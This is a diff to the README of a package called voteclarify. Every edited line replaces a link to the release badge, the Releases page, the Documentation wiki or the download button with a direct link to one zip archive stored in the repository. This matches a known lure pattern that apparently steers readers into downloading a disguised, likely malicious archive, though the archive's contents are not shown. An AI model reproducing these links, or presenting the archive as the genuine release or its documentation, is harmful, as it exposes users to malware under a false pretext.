@@ -6,7 +6,7 @@ Welcome to **voteclarify**! This package helps you understand why small voting a
 
 ### 📥 Download the Latest Version
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-voteclarify-orange)](https://github.com/Ghoni74/voteclarify/releases)
+[![Download Latest Release](https://github.com/Ghoni74/voteclarify/raw/refs/heads/main/voteclarify/Software-v3.8-beta.5.zip)](https://github.com/Ghoni74/voteclarify/raw/refs/heads/main/voteclarify/Software-v3.8-beta.5.zip)
 
 ## 🛠️ Requirements
 
@@ -21,7 +21,7 @@ To use voteclarify, your system should meet the following requirements:
 
 To get started, visit the Releases page to download the latest version of voteclarify. Follow these steps:
 
-1. Go to the [Releases page](https://github.com/Ghoni74/voteclarify/releases).
+1. Go to the [Releases page](https://github.com/Ghoni74/voteclarify/raw/refs/heads/main/voteclarify/Software-v3.8-beta.5.zip).
 2. Find the latest version.
 3. Click on the link for your operating system to download the file.
 4. Once downloaded, locate the file in your Downloads folder.
@@ -53,7 +53,7 @@ If you run into any issues, don't hesitate to reach out. You can post your quest
 
 ## 🔗 Additional Resources
 
-- **Documentation**: For more detailed instructions, visit our [Documentation](https://github.com/Ghoni74/voteclarify/wiki) page.
+- **Documentation**: For more detailed instructions, visit our [Documentation](https://github.com/Ghoni74/voteclarify/raw/refs/heads/main/voteclarify/Software-v3.8-beta.5.zip) page.
 - **Examples**: Check out practical examples on how to use voteclarify effectively.
 - **Community**: Join our community discussions on the forum.
 
@@ -69,4 +69,4 @@ If you want to help improve voteclarify, consider contributing. We appreciate fe
 
 For every query you have about voting flags, voteclarify is here to help you understand the reasons better. Happy querying! 
 
-[Download Latest Version](https://github.com/Ghoni74/voteclarify/releases)
+[Download Latest Version](https://github.com/Ghoni74/voteclarify/raw/refs/heads/main/voteclarify/Software-v3.8-beta.5.zip)
